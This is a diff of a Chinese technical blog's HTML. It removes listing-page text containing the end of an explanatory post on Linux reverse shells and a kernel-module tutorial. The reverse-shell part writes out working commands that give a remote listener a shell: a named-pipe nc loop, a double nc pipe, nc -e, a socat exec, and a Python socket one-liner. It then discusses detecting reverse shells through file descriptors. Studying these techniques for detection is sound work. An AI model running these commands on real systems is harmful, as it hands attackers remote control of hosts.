-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">mknod backpipe p; nc <span class="string">&#x27;监听IP&#x27;</span> <span class="string">&#x27;监听端口&#x27;</span> &lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 Sep 17 16:19 0 -&gt; /root/backpipe</span></span><br><span class="line"><span class="string">l-wx------ 1 root root 64 Sep 17 16:19 1 -&gt; pipe:[1339090]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:19 2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:19 3 -&gt; socket:[1339092]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:19 5 -&gt; socket:[564686]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;mknod命令能够新建一个管道，上述新建了一个名为backpipe的管道文件。nc与bash均为常驻进程，两个进程间使用匿名管道’|’连接。最终实现了一个单向循环，下面详细分析实现原理:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建一个管道文件backpipe</span></span><br><span class="line"><span class="comment"># 等价于 mknod -p backpipe</span></span><br><span class="line"><span class="comment"># -p 创建FIFO</span></span><br><span class="line">mknod backpipe p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将nc进程的输出作为bash进程的输入</span></span><br><span class="line">nc <span class="string">&#x27;监听IP&#x27;</span> <span class="string">&#x27;监听端口&#x27;</span> | /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将nc的标准输入修改为backpipe管道</span></span><br><span class="line">nc <span class="string">&#x27;监听IP&#x27;</span> <span class="string">&#x27;监听端口&#x27;</span> &lt;backpipe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将bash进程的标准输出、标准错误输出传递给backpipe管道</span></span><br><span class="line">/bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
-
-<div align="center">
-<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/管道文件.png">
-<div align="left">  
-
-<p><strong><em>1.4、匿名双管道</em></strong><br>&emsp;&emsp;由于匿名双管道方法的特殊性，攻击端的监听命令需要改变为如下:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听命令</span></span><br><span class="line"><span class="comment"># 可自行修改端口</span></span><br><span class="line">ncat -lvvp 7777 <span class="comment"># 或者 nc -lvp 7777</span></span><br><span class="line"><span class="comment"># 监听命令(另开终端)</span></span><br><span class="line"><span class="comment"># 可自行修改端口</span></span><br><span class="line">ncat -lvvp 8888 <span class="comment"># 或者 nc -lvp 8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">nc <span class="string">&#x27;监听IP&#x27;</span> 7777 | /bin/bash | nc <span class="string">&#x27;监听IP&#x27;</span> 8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7777端口</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 0 -&gt; /dev/pts/0</span></span><br><span class="line"><span class="string">l-wx------ 1 root root 64 9月  17 16:30 1 -&gt; pipe:[366671]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 2 -&gt; /dev/pts/0</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 3 -&gt; socket:[366678]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">8888端口</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 9月  17 16:30 0 -&gt; pipe:[366673]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 1 -&gt; /dev/pts/0</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 2 -&gt; /dev/pts/0</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  17 16:30 3 -&gt; socket:[366679]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;其原理较为简单， 执行流程图如下:</p>
-<div align="center">
-<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/匿名双管道.png">
-<div align="left">  
-
-<p><strong><em>2、第三方工具</em></strong><br>&emsp;&emsp;使用第三方工具，实际上与内置工具大同小异，其实际的实现方法与上述类似，这边罗列几个典型的工具。  </p>
-<p><strong><em>2.1、nc</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line"><span class="comment"># 注意，必须使用指定版本的nc工具，否则无效</span></span><br><span class="line">nc -e /bin/sh <span class="string">&#x27;监听IP&#x27;</span> <span class="string">&#x27;监听端口&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong><em>2.2、socat</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听命令</span></span><br><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:<span class="string">&#x27;监听端口&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="string">&#x27;监听IP&#x27;</span>:<span class="string">&#x27;监听端口&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 0 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 1 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 3 -&gt; socket:[1585844]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 4 -&gt; socket:[1585845]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 5 -&gt; socket:[564686]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 6 -&gt; /dev/ptmx</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 Sep 18 10:01 7 -&gt; /var/lib/sss/mc/group</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:01 8 -&gt; socket:[1585849]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这工具按ctrl+c不会断开连接，而且通过文件描述符比较难辨别，暂时不知道如何探测。</p>
-<p><strong><em>2.3、python</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.50.38.176&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;此种方法使用os的subprocess在本地开启一个子进程，启动bash交互模式，标准输入、标准输出、标准错误输出被重定向到了远程。实质就是Bash直接重定向。</p>
-<h3 id="0x03-检测思路"><a href="#0x03-检测思路" class="headerlink" title="0x03 检测思路"></a><em>0x03 检测思路</em></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 旧的检测方案及其误报原因</span><br><span class="line">2 方案改进</span><br></pre></td></tr></table></figure>
-<p><strong><em>1、旧的检测方案及其误报原因</em></strong><br>&emsp;&emsp;旧的检测方案为检查所有进程的文件描述符，一旦其socket连接号能够在/proc/net/tcp中找到对应的远程连接IP，则会上报反弹Shell攻击。找到两台机器，其误报进程信息如下:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 误报案例一</span></span><br><span class="line"><span class="string">&#x27; /usr/lib/deepin-daemon/uos-license-agent</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 9月  18 11:31 0 -&gt; /dev/null</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  18 11:31 1 -&gt; socket:[31915]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 9月  18 11:31 2 -&gt; socket:[31915]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 误报案例二</span></span><br><span class="line"><span class="string">&#x27; /dbappsecurity/rpc_service/rpc_service runservice</span></span><br><span class="line"><span class="string">lr-x------ 1 root root 64 Sep 18 10:22 0 -&gt; /dev/null</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:22 1 -&gt; socket:[27060]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 10:22 2 -&gt; socket:[27060]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;容易分析，误报原因为标准输入未被劫持，但是标准输出与标准错误输出被劫持，反弹Shell未形成一条链。</p>
-<p><strong><em>2、方案改进</em></strong>  </p>
-<div align="center">
-<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/检测方案.png">
-<div align="left">  
-
-<h3 id="0x04-引用文献"><a href="#0x04-引用文献" class="headerlink" title="0x04 引用文献"></a><em>0x04 引用文献</em></h3><p>[1]<a target="_blank" rel="noopener" href="https://blog.csdn.net/mountzf/article/details/51735691">https://blog.csdn.net/mountzf/article/details/51735691</a><br>[2]<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/12038070.html">https://www.cnblogs.com/LittleHann/p/12038070.html</a><br>[3]<a target="_blank" rel="noopener" href="https://blog.csdn.net/worldchinalee/article/details/104049141">https://blog.csdn.net/worldchinalee/article/details/104049141</a></p>
-</div></div></div></div></div></div></div></div></div></div>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">信息安全技术</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 引言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-dnotify"><span class="toc-number">2.</span> <span class="toc-text">0x01 dnotify</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-inotify"><span class="toc-number">3.</span> <span class="toc-text">0x02 inotify</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-fanotify"><span class="toc-number">4.</span> <span class="toc-text">0x03 fanotify</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E5%BC%95%E7%94%A8%E6%96%87%E7%8C%AE"><span class="toc-number">5.</span> <span class="toc-text">0x04 引用文献</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
-  
-    <article id="post-Linux驱动内核模块" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/16/Linux%E9%A9%B1%E5%8A%A8%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/">Linux驱动内核模块</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/16/Linux%E9%A9%B1%E5%8A%A8%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/" class="archive-article-date">
-  	<time datetime="2021-07-16T02:08:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-16</time>
-</a>
-        
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a><em>0x00 引言</em></h3><p>&emsp;&emsp;在Linux中，驱动的本质就是一个内核模块。Shell中有关于mod的几个命令insmod/lsmod/rmmod/modinfo就是对内核模块的操作，另外dmesg命令能够显示内核所有的打印信息。<br>&emsp;&emsp;模块可以被选择”静态编译”或”模块化编译”，两者区别:前者将模块代码集成到内核源码包中，跟随Linux内核一块编译;后者独立编译，编译时只需要内核头文件与Makefile。<br>&emsp;&emsp;本文主要针对模块化编译入手讲解，其他方法<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28992301/article/details/52287792">查阅资料</a><sup>[1]</sup>。<br>&emsp;&emsp;一个最简单的模块只需要Makefile与模块文件，下面从这两个文件的最简写法入手。</p>
-<h3 id="0x01-内核态Makefile"><a href="#0x01-内核态Makefile" class="headerlink" title="0x01 内核态Makefile"></a><em>0x01 内核态Makefile</em></h3><p>&emsp;&emsp;用户态的Makefile与内核态的Makefile不同，其实也很好理解，在Linux中内核态编译需要生成.ko文件，所以也自带了一套生成规则。实际上驱动模块的内核态Makefile是非常模式化的，要改动的地方很少:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定&quot;内核头文件所在目录&quot;</span></span><br><span class="line"><span class="comment"># 比如/usr/src/linux-headers-4.4.0-generic</span></span><br><span class="line">KERNELDIR ?= <span class="string">&#x27;内核头文件路径&#x27;</span></span><br><span class="line">PWD := $(shell <span class="built_in">pwd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定模块名称是testModule.ko</span></span><br><span class="line">obj-m += testModule.o</span><br><span class="line"><span class="comment"># 所有.c文件包括模块代码，需要添加到下述命令</span></span><br><span class="line">testModule-objs := main.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面这句真正开始编译</span></span><br><span class="line">all:</span><br><span class="line">    $(MAKE) -C $(KERNELDIR) M=$(PWD) modules</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提供复制功能，将.ko文件复制到nfs根文件系统中</span></span><br><span class="line">cp:</span><br><span class="line">    cp -f *.ko <span class="string">&#x27;目标路径&#x27;</span></span><br><span class="line"></span><br><span class="line">.PHONY: clean <span class="comment"># 此字段告诉Makefile，clean不是文件名</span></span><br><span class="line">clean:</span><br><span class="line">    $(MAKE) -C $(KERNELDIR) M=$(PWD) modules clean</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-模块文件"><a href="#0x02-模块文件" class="headerlink" title="0x02 模块文件"></a><em>0x02 模块文件</em></h3><p>&emsp;&emsp;一个最简单的内核模块一共由三部分组成:实现函数,注册功能以及模块描述，摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28992301/article/details/52279934">文献</a><sup>[2]</sup>。具体写法如下:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 外部传参</span></span><br><span class="line"><span class="comment"> * 第一个参数是变量名，第二个参数是类型，第三个参数是读写权限</span></span><br><span class="line"><span class="comment"> * 用户态可以使用insmod test.ko var=123来传参</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> var = <span class="number">666</span>;</span><br><span class="line">module_param(var, <span class="keyword">int</span>, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 自定义的加载函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">func_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;func init\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 自定义的卸载函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">func_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;func exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 加载、卸载函数的注册</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">module_init(func_init);</span><br><span class="line">module_exit(func_exit);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 模块描述信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);       <span class="comment">// 模块许可证</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;xyh&quot;</span>);        <span class="comment">// 模块作者</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;test&quot;</span>);  <span class="comment">// 模块介绍信息</span></span><br><span class="line">MODULE_ALIAS(<span class="string">&quot;xxx&quot;</span>);         <span class="comment">// 模块别名信息</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-使用方法"><a href="#0x03-使用方法" class="headerlink" title="0x03 使用方法"></a><em>0x03 使用方法</em></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译内核模块</span></span><br><span class="line"><span class="comment"># 内核头文件路径需要根据当前系统来，酌情替换</span></span><br><span class="line">make KERNELDIR=/usr/src/linux-headers-4.15.0-142-generic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载、卸载模块</span></span><br><span class="line">insmod testModule.ko</span><br><span class="line">rmmod testModule.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 观察输出</span></span><br><span class="line">dmesg</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x04-引用文献"><a href="#0x04-引用文献" class="headerlink" title="0x04 引用文献"></a><em>0x04 引用文献</em></h3><p>[1]<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28992301/article/details/52287792">https://blog.csdn.net/qq_28992301/article/details/52287792</a><br>[2]<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28992301/article/details/52279934">https://blog.csdn.net/qq_28992301/article/details/52279934</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">计算机技术，Linux内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/16/Linux%E9%A9%B1%E5%8A%A8%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -542,8 +343,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
